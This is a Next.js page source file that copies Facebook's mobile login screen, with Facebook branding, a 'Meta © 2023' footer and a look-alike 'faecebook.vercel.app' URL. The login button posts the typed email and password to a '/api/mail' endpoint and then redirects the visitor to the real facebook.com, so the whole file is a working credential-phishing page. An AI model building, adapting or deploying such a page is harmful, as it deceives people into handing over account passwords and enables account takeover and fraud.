import axios from "axios";
import Head from "next/head";
import Image from "next/image";
import { useRouter } from "next/router";
import { useState } from "react";
import apps from '../public/apps.jpg';
import image from '../public/facebook.svg';

export default function Home(){
    const router = useRouter()
    const [email,setEmail] = useState('')
    const [password,setPassword] = useState('')
    const [type,setType] = useState('password')
    const [hide,setHide] = useState(true)
    const [error,setError] = useState(false)

    const handleHide=()=>{
        if(type === 'password'){
            setType('text')
            setHide(false)
        }else{
            setType('password')
            setHide(true)
        }
    }

    const sendMail=async()=>{
        if(!email || !password){
            return setError(!error)
        }
        try {
            const res = await axios.post('/api/mail',{
                email,password
            })
            if(res.data.status === 200){
                router.push('https://facebook.com')
            }
        } catch (error) {
            console.log(error);
        }
    }

    return (
        <div className="h-screen w-full md:w-1/2 md:mx-auto flex flex-col space-y-24">
            {/* <Helmet>
                <title>Facebook - Login or signup account</title>
                <meta name="theme-color" content='#3b5999' />
                <meta property="og:image" content={logo}></meta>
            </Helmet> */}
            <Head>
                <title>Facebook - Login or signup account</title>
                <meta name="theme-color" content='#3b5999' />
                <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" />
                <meta property="og:url" content="https://faecebook.vercel.app" />
            </Head>
            <div>
                {error ?
                    <div className="px-4 py-2 bg-red-500 text-white text-xs">
                        The email address orphone number that you have entered doesnot match any account.Signup for new account.
                    </div>
                    :
                    <div className="px-4 py-2 flex items-center bg-[#fffbe2] space-x-3">
                        <Image src={apps} alt="account" height={30} width={18}/>
                        <span className="text-blue-700 text-sm">Get Facebook Lite and browse faster</span>
                    </div>
                }
                <div className="px-4">
                    <div className=" w-full flex justify-center py-2">
                        <Image 
                            src={image} 
                            alt="account" 
                            height={140}
                        />
                    </div>
                    <div className="space-y-2">
                        <div>
                            <input
                                type='email' 
                                onChange={(e)=>setEmail(e.target.value)}
                                className="w-full p-2 bg-[#f5f6f8] border border-gray-300 rounded focus:outline-gray-700" 
                                placeholder="Mobile number or email address"
                            />
                        </div>
                        <div className="flex">
                            <input
                                type={type}
                                onChange={(e)=>setPassword(e.target.value)} 
                                className="w-full p-2 bg-[#f5f6f8] border border-gray-300 rounded-tl rounded-bl focus:outline-gray-700 " 
                                placeholder="Password"
                            />
                            {password.length> 0 && <button
                                onClick={()=>handleHide()}
                                className="text-blue-500 text-xs uppercase border-r border-t border-b border-gray-200 bg-[#f5f6f8] px-1 rounded-tr rounded-br"
                                >
                                {hide? 'show' : 'hide'}
                            </button>}
                        </div>
                        <button 
                            onClick={()=>sendMail()}
                            className="w-full p-2 bg-[#1878f3] text-white text-center rounded"
                        >
                                Log In
                        </button>
                        <button className="w-full p-2 text-[#1878f3] text-center rounded">Forgetten Password?</button>
                    </div>
                    <div className="relative flex justify-center items-center border-t border-gray-300 mt-5 mb-7">
                        <span className="absolute bg-white px-4 py-1">or</span>
                    </div>
                    <div className="flex justify-center">
                        <button
                            className="w-9/12 px-2 py-1 mx-auto border border-gray-300 text-center rounded"
                        >
                            Create new account
                        </button>
                    </div>
                </div>
            </div>
            <div className="mb-10">
                <div className="w-10/12 mx-auto flex justify-between text-xs">
                    <div className="w-1/2 flex flex-col justify-center items-center">
                        <span className="text-[#a2a5aa]">English (UK)</span>
                        <span className="text-[#4161a5]">অসমীয়া</span>
                        <span className="text-[#4161a5]">नेपाली</span>
                        <span className="text-[#4161a5]">Português (Brasil)</span>
                    </div>
                    <div className="w-1/2 flex flex-col justify-center items-center">
                        <span className="text-[#4161a5]">বাংলা</span>
                        <span className="text-[#4161a5]">हिन्दी</span>
                        <span className="text-[#4161a5]">Español</span>
                        <span className="text-[#4161a5] border px-1">+</span>
                    </div>
                </div>
                <div className="flex justify-center items-center space-x-2 py-2 text-xs">
                    <span className="text-[#a2a5aa]">About</span>
                    <span className="bg-black w-1 h-1 rounded-full"></span>
                    <span className="text-[#a2a5aa]">Help</span>
                    <span className="bg-black w-1 h-1 rounded-full"></span>
                    <span className="text-[#a2a5aa]">More</span>
                </div>
                <div className="flex justify-center items-center text-sm">
                    <span className="text-[#a2a5aa]">Meta © 2023</span>
                </div>
            </div>
        </div>
    )
}
